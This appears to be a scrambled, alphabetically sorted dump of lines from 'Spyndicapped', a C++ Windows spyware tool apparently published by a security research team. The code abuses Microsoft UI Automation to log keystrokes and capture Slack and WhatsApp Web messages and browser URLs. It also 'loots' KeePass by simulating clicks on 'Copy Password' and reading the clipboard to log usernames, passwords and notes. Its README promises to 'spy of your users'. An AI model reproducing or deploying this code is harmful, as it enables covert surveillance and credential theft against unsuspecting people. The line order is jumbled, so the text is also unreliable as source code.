"include ""MyPropertyChangedEventHandler.h"""
"include ""MyPropertyChangedEventHandlerApps.h"""
"include ""MyTreeWalker.h"""
"index, "
"int wmain(int argc, wchar_t"
"localTime, "
"localTime, L""%H:%M:%S"")"
"localTime, L""%Y-%m-%d"")"
"logFile, g_LogFileName.c_str(), L""a, ccs=UTF-16LE"")"
"mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0)"
"mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)"
"n"", message.c_str())"
"n--------------[Opened new Window]--------------"""
"n--------------[RAW CONTENT]--------------"""
"n--------------[User pressed the button]--------------"""
"nDecrypted Password: "" "
"nMsg: "" "
"nNew Name: "" "
"nNew Value: "" "
"nNotes: "" "
"nPassword: "" "
"nTitle: "" "
"nTo: "" "
"nURL: "" "
"nUnhanled property! Trying to guess..."" "
"nUsername: "" "
"pAutomation->CreateAndCondition(pAndCondition1, pInvokePatternCondition, "
"pAutomation->CreateAndCondition(pAndCondition2, pScrollItemPatternCondition, "
"pAutomation->CreateAndCondition(pControlTypeCondition, pDefaultActionCondition, "
"pAutomation->CreatePropertyCondition(UIA_AutomationIdPropertyId, _variant_t(L""MainForm""), "
"pAutomation->CreatePropertyCondition(UIA_ControlTypePropertyId, CComVariant(UIA_ButtonControlTypeId), "
"pAutomation->CreatePropertyCondition(UIA_IsInvokePatternAvailablePropertyId, CComVariant(true), "
"pAutomation->CreatePropertyCondition(UIA_IsScrollItemPatternAvailablePropertyId, CComVariant(true), "
"pAutomation->CreatePropertyCondition(UIA_LegacyIAccessibleDefaultActionPropertyId, CComVariant(L""click""), "
"pAutomation->CreatePropertyCondition(UIA_NamePropertyId, _variant_t(L""Copy Password""), "
"pAutomation->CreatePropertyCondition(UIA_NamePropertyId, _variant_t(L""DropDown""), "
"pAutomation->ElementFromHandle(data.hwnd, "
"pAutomationElement = Finder::GetUIAElementByName(pAutomation, windowName)"
"pAutomationElement = Finder::GetUIAElementByPID(pAutomation, pid)"
"pAutomationElementProfileInfo = g_pMyTreeWalker->FindFirstAscending(pAutomationElement, pAndCondition3)"
"pAutomationElementUrlBar = g_pMyTreeWalker->FindFirstAscending(pAutomationElement, pCondition)"
"pDbTreeElement = g_pMyTreeWalker->FindFirstAscending(pAutomationElement, pDbTreeElementCondition)"
"pDbTreeElement->FindFirst(TreeScope_Children, pBranchDbTreeElementCondition, "
"pMainWindow = g_pMyTreeWalker->FindFirstAscending(pEntryChildPasswordElement, pMainWindowCondition)"
"pOverlayWnd, HWND_TOPMOST, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, SWP_SHOWWINDOW)"
"pOverlayWnd, RGB(192, 192, 192), 255, LWA_COLORKEY)"
"pOverlayWnd, SW_SHOW)"
"pPassListEl = g_pMyTreeWalker->FindFirstAscending(pAutomationElement, pPassListCondition)"
"pid = static_cast<DWORD>(std::wcstoul(pidStr.c_str(), nullptr, 10))"
"pos = domain.find(L""/"")"
"pos = domain.find(L"":"")"
"propertyChangedThread = std::thread(MyPropertyChangedEventHandler::Deploy, pAutomation, pAutomationElement, timeout)"
"ps.rcPaint, hBrush)"
"return L"""""
"return L""Unknown Control Type"""
"return L""Unknown Event"""
"size_t lastSlashPos = fullPath.find_last_of(L"""
"size_t pos = domain.find(L""://"")"
"static const std::unordered_map<CONTROLTYPEID, std::wstring> controlTypeIdMap = {"
"static const std::unordered_map<EVENTID, std::wstring> eventIdMap = {"
"static void CreateOverlay(HWND hwnd, HWND"
"std::transform(input.begin(), input.end(), output.begin(), ::tolower)"
"std::unordered_map<std::wstring, std::function<void()>> handlers = {"
"std::wcout << L"""
"std::wcout << L""There are different work modes:"" << std::endl"
"std::wcout << L""[FIND mode]"" << std::endl"
"std::wcout << L""[Other]"" << std::endl"
"std::wcout << L""[SPY mode]"" << std::endl"
"std::wcout << R""(              "
"std::wstring g_LogFileName = L"""""
"std::wstring oldTextValue = L"""""
"std::wstring pidStr = getCmdOption(argv, argv "
"std::wstring wname(bName, SysStringLen(bName))"
"std::wstring wsClipBoardData = L"""""
"std::wstring wsControlType = L"""""
"std::wstring wsDomain = L"""""
"std::wstring wsLogKeyStroke = L"""""
"std::wstring wsUrl = L"""""
"std::wstring wsWindowName(bWindowName, SysStringLen(bWindowName))"
"t --debug <- displays more information"" << std::endl"
"t --ignore-handlers <- I have created handlers for various apps, but u can use the generic HandleOther() with this flag"" << std::endl"
"t --logfile <filename> <- store all events into the log file"" << std::endl"
"t --no-property-events <- disables MyPropertyChangedEventHandler"" << std::endl"
"t --no-uia-events <- disables MyAutomationEventHandler"" << std::endl"
"t --pid <pid> <- grabs information from that process (GUI Required)"" << std::endl"
"t --timeout <sec> <- interval to process events (default 1 sec)"" << std::endl"
"t --window <name> <- grabs information from that window"" << std::endl"
"t Spyndicapped.exe find"" << std::endl"
"t Spyndicapped.exe spy --pid 123"" << std::endl"
"t Spyndicapped.exe spy"" << std::endl"
"tClass: "" "
"tControlType: "" "
"tDisplays the windows available for spying with --window or --pid"" << std::endl"
"tHelp: "" "
"tLocalizedControlType: "" "
"tName: "" "
"tProp Value: "" "
"tWindow(s) spying mode"" << std::endl"
"tWindow: "" "
"t[EXAMPLES]"" << std::endl"
"timeout = static_cast<int>(std::wcstoul(pidStr.c_str(), nullptr, 10))"
"vAutomationId.bstrVal = SysAllocString(L""urlbar-input"")"
"void Helpers::CreateOverlay(HWND hwnd, HWND"
"windowName = getCmdOption(argv, argv "
"wsWindowName = L""<Empty>"""
"x64"">"
"x64'"" Label=""Configuration"">"
"x64'"">"
"xml version=""1.0"" encoding=""utf-8"""
"{ L""app.slack.com"", [this, pAutomationElement, wsProcName, wsDate]() { HandleSlackFF(pAutomationElement, wsProcName, wsDate)"
"{ L""chrome.exe"", [this, pAutomationElement, wsProcName, wsDate, propId, vVar]() { HandleChrome(pAutomationElement, wsProcName, wsDate, propId, vVar)"
"{ L""explorer.exe"", [this, pAutomationElement, wsProcName, wsEventString, wsDate, eventID]() { HandleExplorer(pAutomationElement, wsProcName, wsEventString, wsDate, eventID)"
"{ L""firefox.exe"", [this, pAutomationElement, wsProcName, wsEventString, wsDate, eventID]() { HandleFirefox(pAutomationElement, wsProcName, wsEventString, wsDate, eventID)"
"{ L""keepass.exe"", [this, pAutomationElement, wsProcName, wsDate, propId, vVar]() { HandleKeepass(pAutomationElement, wsProcName, wsDate, propId, vVar)"
"{ L""web.whatsapp.com"", [this, pAutomationElement, wsProcName, wsDate]() { HandleWhatsAppFF(pAutomationElement, wsProcName, wsDate)"
"{ UIA_ActiveTextPositionChangedEventId, L""UIA_ActiveTextPositionChangedEventId"" },"
"{ UIA_AnnotationAnnotationTypeIdPropertyId, L""UIA_AnnotationAnnotationTypeIdPropertyId"" },"
"{ UIA_AnnotationAnnotationTypeNamePropertyId, L""UIA_AnnotationAnnotationTypeNamePropertyId"" },"
"{ UIA_AnnotationAuthorPropertyId, L""UIA_AnnotationAuthorPropertyId"" },"
"{ UIA_AnnotationDateTimePropertyId, L""UIA_AnnotationDateTimePropertyId"" },"
"{ UIA_AnnotationTargetPropertyId, L""UIA_AnnotationTargetPropertyId"" },"
"{ UIA_AsyncContentLoadedEventId, L""UIA_AsyncContentLoadedEventId"" },"
"{ UIA_AutomationFocusChangedEventId, L""UIA_AutomationFocusChangedEventId"" },"
"{ UIA_AutomationPropertyChangedEventId, L""UIA_AutomationPropertyChangedEventId"" },"
"{ UIA_ChangesEventId, L""UIA_ChangesEventId"" },"
"{ UIA_DockDockPositionPropertyId, L""UIA_DockDockPositionPropertyId"" },"
"{ UIA_DragDropEffectPropertyId, L""UIA_DragDropEffectPropertyId"" },"
"{ UIA_DragDropEffectsPropertyId, L""UIA_DragDropEffectsPropertyId"" },"
"{ UIA_DragGrabbedItemsPropertyId, L""UIA_DragGrabbedItemsPropertyId"" },"
"{ UIA_DragIsGrabbedPropertyId, L""UIA_DragIsGrabbedPropertyId"" },"
"{ UIA_Drag_DragCancelEventId, L""UIA_Drag_DragCancelEventId"" },"
"{ UIA_Drag_DragCompleteEventId, L""UIA_Drag_DragCompleteEventId"" },"
"{ UIA_Drag_DragStartEventId, L""UIA_Drag_DragStartEventId"" },"
"{ UIA_DropTargetDropTargetEffectPropertyId, L""UIA_DropTargetDropTargetEffectPropertyId"" },"
"{ UIA_DropTargetDropTargetEffectsPropertyId, L""UIA_DropTargetDropTargetEffectsPropertyId"" },"
"{ UIA_DropTarget_DragEnterEventId, L""UIA_DropTarget_DragEnterEventId"" },"
"{ UIA_DropTarget_DragLeaveEventId, L""UIA_DropTarget_DragLeaveEventId"" },"
"{ UIA_DropTarget_DroppedEventId, L""UIA_DropTarget_DroppedEventId"" },"
"{ UIA_ExpandCollapseExpandCollapseStatePropertyId, L""UIA_ExpandCollapseExpandCollapseStatePropertyId"" },"
"{ UIA_GridColumnCountPropertyId, L""UIA_GridColumnCountPropertyId"" },"
"{ UIA_GridItemColumnPropertyId, L""UIA_GridItemColumnPropertyId"" },"
"{ UIA_GridItemColumnSpanPropertyId, L""UIA_GridItemColumnSpanPropertyId"" },"
"{ UIA_GridItemContainingGridPropertyId, L""UIA_GridItemContainingGridPropertyId"" },"
"{ UIA_GridItemRowPropertyId, L""UIA_GridItemRowPropertyId"" },"
"{ UIA_GridItemRowSpanPropertyId, L""UIA_GridItemRowSpanPropertyId"" },"
"{ UIA_GridRowCountPropertyId, L""UIA_GridRowCountPropertyId"" },"
"{ UIA_HostedFragmentRootsInvalidatedEventId, L""UIA_HostedFragmentRootsInvalidatedEventId"" },"
"{ UIA_InputDiscardedEventId, L""UIA_InputDiscardedEventId"" },"
"{ UIA_InputReachedOtherElementEventId, L""UIA_InputReachedOtherElementEventId"" },"
"{ UIA_InputReachedTargetEventId, L""UIA_InputReachedTargetEventId"" },"
"{ UIA_Invoke_InvokedEventId, L""UIA_Invoke_InvokedEventId"" },"
"{ UIA_LayoutInvalidatedEventId, L""UIA_LayoutInvalidatedEventId"" },"
"{ UIA_LegacyIAccessibleChildIdPropertyId, L""UIA_LegacyIAccessibleChildIdPropertyId"" },"
"{ UIA_LegacyIAccessibleDefaultActionPropertyId, L""UIA_LegacyIAccessibleDefaultActionPropertyId"" },"
"{ UIA_LegacyIAccessibleDescriptionPropertyId, L""UIA_LegacyIAccessibleDescriptionPropertyId"" },"
"{ UIA_LegacyIAccessibleHelpPropertyId, L""UIA_LegacyIAccessibleHelpPropertyId"" },"
"{ UIA_LegacyIAccessibleKeyboardShortcutPropertyId, L""UIA_LegacyIAccessibleKeyboardShortcutPropertyId"" },"
"{ UIA_LegacyIAccessibleNamePropertyId, L""UIA_LegacyIAccessibleNamePropertyId"" },"
"{ UIA_LegacyIAccessibleRolePropertyId, L""UIA_LegacyIAccessibleRolePropertyId"" },"
"{ UIA_LegacyIAccessibleSelectionPropertyId, L""UIA_LegacyIAccessibleSelectionPropertyId"" },"
"{ UIA_LegacyIAccessibleStatePropertyId, L""UIA_LegacyIAccessibleStatePropertyId"" },"
"{ UIA_LegacyIAccessibleValuePropertyId, L""UIA_LegacyIAccessibleValuePropertyId"" },"
"{ UIA_LiveRegionChangedEventId, L""UIA_LiveRegionChangedEventId"" },"
"{ UIA_MenuClosedEventId, L""UIA_MenuClosedEventId"" },"
"{ UIA_MenuModeEndEventId, L""UIA_MenuModeEndEventId"" },"
"{ UIA_MenuModeStartEventId, L""UIA_MenuModeStartEventId"" },"
"{ UIA_MenuOpenedEventId, L""UIA_MenuOpenedEventId"" },"
"{ UIA_MultipleViewCurrentViewPropertyId, L""UIA_MultipleViewCurrentViewPropertyId"" },"
"{ UIA_MultipleViewSupportedViewsPropertyId, L""UIA_MultipleViewSupportedViewsPropertyId"" },"
"{ UIA_NotificationEventId, L""UIA_NotificationEventId"" },"
"{ UIA_RangeValueIsReadOnlyPropertyId, L""UIA_RangeValueIsReadOnlyPropertyId"" },"
"{ UIA_RangeValueLargeChangePropertyId, L""UIA_RangeValueLargeChangePropertyId"" },"
"{ UIA_RangeValueMaximumPropertyId, L""UIA_RangeValueMaximumProperty Id"" },"
"{ UIA_RangeValueMinimumPropertyId, L""UIA_RangeValueMinimumPropertyId"" },"
"{ UIA_RangeValueSmallChangePropertyId, L""UIA_RangeValueSmallChangePropertyId"" },"
"{ UIA_RangeValueValuePropertyId, L""UIA_RangeValueValuePropertyId"" },"
"{ UIA_ScrollHorizontalScrollPercentPropertyId, L""UIA_ScrollHorizontalScrollPercentPropertyId"" },"
"{ UIA_ScrollHorizontalViewSizePropertyId, L""UIA_ScrollHorizontalViewSizePropertyId"" },"
"{ UIA_ScrollVerticalScrollPercentPropertyId, L""UIA_ScrollVerticalScrollPercentPropertyId"" },"
"{ UIA_ScrollVerticalViewSizePropertyId, L""UIA_ScrollVerticalViewSizePropertyId"" },"
"{ UIA_SelectionCanSelectMultiplePropertyId, L""UIA_SelectionCanSelectMultiplePropertyId"" },"
"{ UIA_SelectionIsSelectionRequiredPropertyId, L""UIA_SelectionIsSelectionRequiredPropertyId"" },"
"{ UIA_SelectionItem_ElementAddedToSelectionEventId, L""UIA_SelectionItem_ElementAddedToSelectionEventId"" },"
"{ UIA_SelectionItem_ElementRemovedFromSelectionEventId, L""UIA_SelectionItem_ElementRemovedFromSelectionEventId"" },"
"{ UIA_SelectionItem_ElementSelectedEventId, L""UIA_SelectionItem_ElementSelectedEventId"" },"
"{ UIA_SelectionSelectionPropertyId, L""UIA_SelectionSelectionPropertyId"" },"
"{ UIA_Selection_InvalidatedEventId, L""UIA_Selection_InvalidatedEventId"" },"
"{ UIA_StructureChangedEventId, L""UIA_StructureChangedEventId"" },"
"{ UIA_SystemAlertEventId, L""UIA_SystemAlertEventId"" },"
"{ UIA_TableColumnHeadersPropertyId, L""UIA_TableColumnHeadersPropertyId"" },"
"{ UIA_TableItemColumnHeaderItemsPropertyId, L""UIA_TableItemColumnHeaderItemsPropertyId"" },"
"{ UIA_TableItemRowHeaderItemsPropertyId, L""UIA_TableItemRowHeaderItemsPropertyId"" },"
"{ UIA_TableRowHeadersPropertyId, L""UIA_TableRowHeadersPropertyId"" },"
"{ UIA_TextControlTypeId, L""UIA_TextControlTypeId"" },"
"{ UIA_TextEdit_ConversionTargetChangedEventId, L""UIA_TextEdit_ConversionTargetChangedEventId"" },"
"{ UIA_TextEdit_TextChangedEventId, L""UIA_TextEdit_TextChangedEventId"" },"
"{ UIA_Text_TextChangedEventId, L""UIA_Text_TextChangedEventId"" },"
"{ UIA_Text_TextSelectionChangedEventId, L""UIA_Text_TextSelectionChangedEventId"" },"
"{ UIA_ToolTipClosedEventId, L""UIA_ToolTipClosedEventId"" },"
"{ UIA_ToolTipOpenedEventId, L""UIA_ToolTipOpenedEventId"" },"
"{ UIA_ValueValuePropertyId, L""UIA_ValueValuePropertyId"" },"
"{ UIA_WindowCanMaximizePropertyId, L""UIA_WindowCanMaximizePropertyId"" },"
"{ UIA_WindowCanMinimizePropertyId, L""UIA_WindowCanMinimizePropertyId"" },"
"{ UIA_WindowIsModalPropertyId, L""UIA_WindowIsModalPropertyId"" },"
"{ UIA_WindowIsTopmostPropertyId, L""UIA_WindowIsTopmostPropertyId"" },"
"{ UIA_WindowWindowInteractionStatePropertyId, L""UIA_WindowWindowInteractionStatePropertyId"" },"
"{ UIA_WindowWindowVisualStatePropertyId, L""UIA_WindowWindowVisualStatePropertyId"" }"
"{ UIA_Window_WindowClosedEventId, L""UIA_Window_WindowClosedEventId"" },"
"{ UIA_Window_WindowOpenedEventId, L""UIA_Window_WindowOpenedEventId"" }"
$(Platform)'=='Debug
$(Platform)'=='Release
%(PreprocessorDefinitions)</PreprocessorDefinitions>
( eventID == UIA_Text_TextChangedEventId 
(HANDLEDATA
(propId == UIA_NamePropertyId 
)lParam
)pMyAutomationEventHandler)
// Checks new value
// Checks time
// Functions
// Other args
// check for the right field
// checks new value
// checks time
// dont forget about adding event handling in MyAutomationEventHandlerApps.cpp
// find msg receiver
// msg contents
// right-click simulation and copy password to clipboard
// u can make logging whatsapp and slack as in the FF i've made
//Log(Todo///////
//Sleep(300)
</Project>
<< L']'
<< std::put_time(
>(GlobalLock(hData))
>(this)
And whatsapp web:
BOOL isMatch = FALSE
BSTR bClassName = NULL
BSTR bDbName = NULL
BSTR bLocalizedControlType = NULL
BSTR bMsgReceiver = NULL
BSTR bName
BSTR bNotes = NULL
BSTR bPassword = NULL
BSTR bTitleName = NULL
BSTR bURL = NULL
BSTR bUrlBar = NULL
BSTR bUserName = NULL
BSTR bWindowName
BSTR bWindowName = NULL
BSTR previousDb = NULL
CComPtr<IUIAutomation> pAutomation
CComPtr<IUIAutomationCondition> pAndCondition1 = NULL
CComPtr<IUIAutomationCondition> pAndCondition2 = NULL
CComPtr<IUIAutomationCondition> pAndCondition3 = NULL
CComPtr<IUIAutomationCondition> pBranchDbTreeElementCondition = NULL
CComPtr<IUIAutomationCondition> pCondition
CComPtr<IUIAutomationCondition> pCondition = NULL
CComPtr<IUIAutomationCondition> pConditionToElementArrayWithoutHelpButtons = NULL
CComPtr<IUIAutomationCondition> pControlTypeCondition = NULL
CComPtr<IUIAutomationCondition> pCopyPasswordButtonCondition = NULL
CComPtr<IUIAutomationCondition> pDbTreeElementCondition = NULL
CComPtr<IUIAutomationCondition> pDefaultActionCondition = NULL
CComPtr<IUIAutomationCondition> pDropDownMenuCondition = NULL
CComPtr<IUIAutomationCondition> pInvokePatternCondition = NULL
CComPtr<IUIAutomationCondition> pMainWindowCondition = NULL
CComPtr<IUIAutomationCondition> pPassListCondition = NULL
CComPtr<IUIAutomationCondition> pScrollItemPatternCondition = NULL
CComPtr<IUIAutomationCondition> pTrueCondition = NULL
CComPtr<IUIAutomationElement> pAutomationElementChild = pAutomationElement
CComPtr<IUIAutomationElement> pAutomationElementParent
CComPtr<IUIAutomationElement> pAutomationElementParent = NULL
CComPtr<IUIAutomationElement> pAutomationElementProfileInfo = NULL
CComPtr<IUIAutomationElement> pAutomationElementReceiver = NULL
CComPtr<IUIAutomationElement> pAutomationElementUrlBar = NULL
CComPtr<IUIAutomationElement> pBranchDbTreeElement = NULL
CComPtr<IUIAutomationElement> pChildEl
CComPtr<IUIAutomationElement> pCopyPasswordButton = NULL
CComPtr<IUIAutomationElement> pCurrentElement = GetParent(pStartElement)
CComPtr<IUIAutomationElement> pDbTreeElement = NULL
CComPtr<IUIAutomationElement> pDropDownMenu = NULL
CComPtr<IUIAutomationElement> pEntryChildNotesElement = NULL
CComPtr<IUIAutomationElement> pEntryChildPasswordElement = NULL
CComPtr<IUIAutomationElement> pEntryChildTitleElement = NULL
CComPtr<IUIAutomationElement> pEntryChildUrlElement = NULL
CComPtr<IUIAutomationElement> pEntryChildUsernameElement = NULL
CComPtr<IUIAutomationElement> pEntryElement = NULL
CComPtr<IUIAutomationElement> pMainWindow = NULL
CComPtr<IUIAutomationElement> pPassListEl = NULL
CComPtr<IUIAutomationElement> pTargetElement
CComPtr<IUIAutomationElementArray> pElementArray = NULL
CComPtr<IUIAutomationElementArray> pElementArrayWithoutHelpButtons = NULL
CComPtr<IUIAutomationElementArray> pElementsArray
CComPtr<IUIAutomationElementArray> pEntryChild = NULL
CComPtr<IUIAutomationInvokePattern> pInvokePattern
CICADA8 Research Team
CONTROLTYPEID ctId
Check keepass looting above :))
Christmas present from MzHmO
CloseHandle(hProcess)
CoUninitialize()
DWORD Finder::GetPIDByUIAutomationElement(IUIAutomationElement
DWORD cbNeeded
DWORD pid = 0
DWORD pid = Finder::GetPIDByUIAutomationElement(pAutomationElement)
DWORD pid = Finder::GetPIDByUIAutomationElement(pChildEl)
DWORD size = 0
Debug
Debug> .
EMPTY
EndGlobal
EndGlobalSection
EndProject
GetCursorPos(
Global
GlobalSection(ExtensibilityGlobals) = postSolution
GlobalSection(ProjectConfigurationPlatforms) = postSolution
GlobalSection(SolutionConfigurationPlatforms) = preSolution
GlobalSection(SolutionProperties) = preSolution
HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE)
HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION 
HANDLEDATA
HANDLEDATA data
HMODULE hMods[1024]
HRESULT GetFirstAscendingWindowName(IUIAutomationElement
HRESULT Helpers::GetClipBoardData(std::wstring
HRESULT MyTreeWalker::GetFirstAscendingWindowName(IUIAutomationElement
HRESULT STDMETHODCALLTYPE HandleAutomationEvent(IUIAutomationElement
HRESULT STDMETHODCALLTYPE HandlePropertyChangedEvent(IUIAutomationElement
HRESULT STDMETHODCALLTYPE MyAutomationEventHandler::Deploy(IUIAutomation
HRESULT STDMETHODCALLTYPE MyAutomationEventHandler::HandleAutomationEvent(IUIAutomationElement
HRESULT STDMETHODCALLTYPE MyPropertyChangedEventHandler::Deploy(IUIAutomation
HRESULT STDMETHODCALLTYPE MyPropertyChangedEventHandler::HandlePropertyChangedEvent(IUIAutomationElement
HRESULT hr
HRESULT hr = ERROR_SUCCESS
HRESULT hr = pAutomationElementChild->get_CurrentName(bWindowName)
HRESULT hr = pUIAutomation->get_RawViewWalker(
HWND hwnd
HideSolutionNode = FALSE
IUIAutomation
IUIAutomationElement
IUIAutomationTreeWalker
IncrementEventCount()
InterlockedIncrement(
Keepass looting example:
LPCTSTR errMsg = err.ErrorMessage()
Log(
Main</Filter>
MinimumVisualStudioVersion = 10.0.40219.1
MyAutomationEventHandler
MyAutomationEventHandler()
MyAutomationEventHandler</Filter>
MyPropertyChangedEventHandler
MyPropertyChangedEventHandler()
MyPropertyChangedEventHandler</Filter>
MyTreeWalker
MyTreeWalker()
MyTreeWalker(IUIAutomation
MyTreeWalker::
MyTreeWalker::MyTreeWalker(IUIAutomation
MyTreeWalker</Filter>
NDEBUG
POINT originalCursorPos
POINT pt = { (rect.left 
PS A:
PrintErrorFromHRESULT(hr)
RECT rect
Release
SAFEARRAY
ShowAwesomeBanner()
ShowHelp()
SolutionGuid = {CDDA59E4-DCB3-459C-8637-FF9B3F3B8FA0}
Spy of your users with Microsoft UIA! 
Spyndicapped find
Spyndicapped spy
Spyndicapped spy --logfile 1.txt
Spyndicapped spy --pid <pid from find command>
Spyndicapped.exe -h
Spyndicapped_dev
SysFreeString(bClassName)
SysFreeString(bDbName)
SysFreeString(bLocalizedControlType)
SysFreeString(bMsgReceiver)
SysFreeString(bName)
SysFreeString(bNotes)
SysFreeString(bPassword)
SysFreeString(bTitleName)
SysFreeString(bURL)
SysFreeString(bUrlBar)
SysFreeString(bUserName)
SysFreeString(bWindowName)
SysFreeString(previousDb)
The exact same functionality is supported for the Web version of Slack:
There are different work modes:
UIA_Window_WindowOpenedEventId
ULONG Finder::DisplayActiveWindows()
ULONG STDMETHODCALLTYPE AddRef()
ULONG STDMETHODCALLTYPE GetEventCount()
ULONG STDMETHODCALLTYPE MyAutomationEventHandler::AddRef()
ULONG STDMETHODCALLTYPE MyAutomationEventHandler::GetEventCount()
ULONG STDMETHODCALLTYPE MyAutomationEventHandler::Release()
ULONG STDMETHODCALLTYPE MyPropertyChangedEventHandler::AddRef()
ULONG STDMETHODCALLTYPE MyPropertyChangedEventHandler::GetEventCount()
ULONG STDMETHODCALLTYPE MyPropertyChangedEventHandler::Release()
ULONG STDMETHODCALLTYPE Release()
ULONG eventCount = 0
ULONG refCount = 0
ULONG refCount = InterlockedDecrement(
VARIANT vAriaRoleValue
VARIANT vAutomationId
VARIANT vHelp
VARIANT vIAccessibleRoleValue
VARIANT vMsgValue
VARIANT vPid
VARIANT vUrlBar
VARIANT vValue
VARIANT vWindowName
VOID STDMETHODCALLTYPE MyAutomationEventHandler::IncrementEventCount()
VOID STDMETHODCALLTYPE MyPropertyChangedEventHandler::IncrementEventCount()
VariantClear(
VariantInit(
VisualStudioVersion = 17.7.34009.444
Win32
You can find out more details in [this article on medium](https://cicada-8.medium.com/im-watching-you-how-to-spy-windows-users-via-ms-uia-c9acd30f94c4).
[FIND mode]
[Other]
[SPY mode]
[Spyndicapped]
](https://github.com/user-attachments/assets/03458550-9aef-4eaf-b99c-1c98e62ba61e)
](https://github.com/user-attachments/assets/052ae59a-67d8-4d04-9fa1-847a34562af6)
](https://github.com/user-attachments/assets/b5559d1f-8916-4b58-ac0d-016c62e2aae4)
](https://github.com/user-attachments/assets/b88fb837-4cba-4312-8f25-6eb766239544)
](https://github.com/user-attachments/assets/c7e7c40c-5137-44c0-a96d-b044505a177c)
](https://github.com/user-attachments/assets/e14839f0-5692-4eed-868e-4dd3e9336667)
_CONSOLE
_DEBUG
_com_error err(hr)
asmx</Extensions>
auto it = controlTypeIdMap.find(controlTypeId)
auto it = eventIdMap.find(eventID)
auto it = handlers.find(Helpers::ConvertToLower(wsDomain))
auto it = handlers.find(Helpers::ConvertToLower(wsProcName))
auto now = std::chrono::steady_clock::now()
auto now = std::chrono::system_clock::now()
automationThread.join()
bClassName)
bDbName)
bLocalizedControlType)
bMsgReceiver)
bName)
bNotes)
bPassword)
bTitleName)
bURL)
bUserName)
bWindowName)
bWindowName) != 0)
bWindowName) == 0)
bool cmdOptionExists(wchar_t
bool g_DebugModeEnable = false
bool g_IgnoreHandlers = false
break
case UIA_Invoke_InvokedEventId:
case UIA_NamePropertyId:
case UIA_Text_TextChangedEventId:
case UIA_Text_TextSelectionChangedEventId:
case UIA_ValueValuePropertyId:
case UIA_Window_WindowOpenedEventId:
cbNeeded)) {
class Helpers {
class MyAutomationEventHandler : public IUIAutomationEventHandler
class MyPropertyChangedEventHandler : public IUIAutomationPropertyChangedEventHandler {
class MyTreeWalker
continue
count)
cppm
ctId)
data)
data.hwnd = 0
data.hwnd = handle
data.pid = pid
default:
delete g_pMyTreeWalker
delete this
domain = domain.substr(pos 
else
else if (riid == __uuidof(IUIAutomationEventHandler))
else if (riid == __uuidof(IUIAutomationPropertyChangedEventHandler))
else {
enum LogLevel {
eventCount)
exit:
extern MyTreeWalker
extern bool g_DebugModeEnable
extern bool g_IgnoreHandlers
extern std::wstring g_LogFileName
for (int i = 0
for (size_t i = 0
for (wchar_t c : data) {
g_DebugModeEnable = true
g_IgnoreHandlers = true
g_pMyTreeWalker = new MyTreeWalker(pAutomation)
gitrepo
goto exit
hash = ((hash << 5) 
hr = Helpers::GetClipBoardData(wsClipBoardData)
hr = pAutomation->CreateTrueCondition(
hr = pAutomation->GetRootElement(
hr = pAutomationElement->get_CurrentClassName(
hr = pAutomationElement->get_CurrentControlType(
hr = pAutomationElement->get_CurrentLocalizedControlType(
hr = pAutomationElement->get_CurrentName(
hr = pAutomationElementParent->get_CurrentName(bWindowName)
hr = pAutomationElementReceiver->get_CurrentName(
hr = pBranchDbTreeElement->get_CurrentName(
hr = pChildEl->get_CurrentName(
hr = pElementArray->get_Length(
hr = pEntryChildNotesElement->get_CurrentName(
hr = pEntryChildPasswordElement->get_CurrentBoundingRectangle(
hr = pEntryChildPasswordElement->get_CurrentName(
hr = pEntryChildTitleElement->get_CurrentName(
hr = pEntryChildUrlElement->get_CurrentName(
hr = pEntryChildUsernameElement->get_CurrentName(
if (!pAutomationElement)
if (!pAutomationElementParent)
if (!propertyArray)
if ((propId == UIA_NamePropertyId 
if ((std::wstring(vValue.bstrVal) == oldTextValue) 
if (FAILED(hr) 
if (FAILED(hr))
if (FAILED(hr)) {
if (Finder::DisplayActiveWindows() != 0)
if (SUCCEEDED(hr) 
if (SUCCEEDED(hr))
if (SUCCEEDED(hr)) {
if (SysStringLen(
if (V_VT(
if (argc == 1)
if (automationThread.joinable())
if (bClassName)
if (bDbName) {
if (bLocalizedControlType)
if (bMsgReceiver)
if (bNotes) {
if (bPassword) {
if (bTitleName) {
if (bURL) {
if (bUrlBar)
if (bUserName) {
if (bWindowName == NULL)
if (bWindowName)
if (data.hwnd == NULL)
if (data.pid != process_id 
if (g_IgnoreHandlers)
if (g_pMyTreeWalker)
if (hProcess == NULL) {
if (it != controlTypeIdMap.end()) {
if (it != eventIdMap.end()) {
if (it != handlers.end()) {
if (lastSlashPos != std::wstring::npos) {
if (now - lastEventTime < GetEventTimeout())
if (pAutomation == NULL)
if (pAutomationElement == NULL)
if (pAutomationElement)
if (pAutomationElementProfileInfo == NULL)
if (pAutomationElementUrlBar == NULL)
if (pBranchDbTreeElement == NULL)
if (pCurrentElement == NULL)
if (pDbTreeElement == NULL)
if (pMainWindow != NULL)
if (pPassListEl == NULL)
if (pUIAutomation == NULL)
if (pWalker != NULL)
if (pWalker == NULL)
if (pid != -1)
if (pid == -1)
if (pos != std::wstring::npos) {
if (previousDb != NULL 
if (propertyChangedThread.joinable())
if (refCount == 0)
if (riid == __uuidof(IUnknown))
if (vVar.vt == VT_BSTR 
if (vVar.vt == VT_BSTR)
if (wsFileName.empty())
if (wsWindowName.empty())
include <Psapi.h>
include <UIAutomation.h>
include <UIAutomationClient.h>
include <Windows.h>
include <algorithm>
include <atlbase.h>
include <chrono>
include <codecvt>
include <comdef.h>
include <ctime>
include <fcntl.h>
include <fstream>
include <functional>
include <io.h>
include <iomanip>
include <iostream>
include <locale.h>
include <locale>
include <mutex>
include <sstream>
include <string>
include <thread>
include <unordered_map>
include <vector>
include <windows.h>
int count = 0
int length = 0
int timeout = 0
it->second()
itr != end)
jpeg
lastEventTime = now
length)
localtime_s(
long index = static_cast<long>(i)
mfcribbon-ms</Extensions>
n--------------[RAW CONTENT]--------------
now_c)
oldTextValue = std::wstring(vValue.bstrVal)
oldTextValue = std::wstring(vVar.bstrVal)
originalCursorPos)
oss << L'['
pAndCondition1)
pAndCondition2)
pAndCondition3)
pAutomation = g_pMyTreeWalker->GetPAutomation()
pAutomation = pUIAutomation
pAutomation)
pAutomation->GetRootElement(
pAutomation->Release()
pAutomationElement)
pAutomationElement->Release()
pAutomationElementChild = pAutomationElementParent
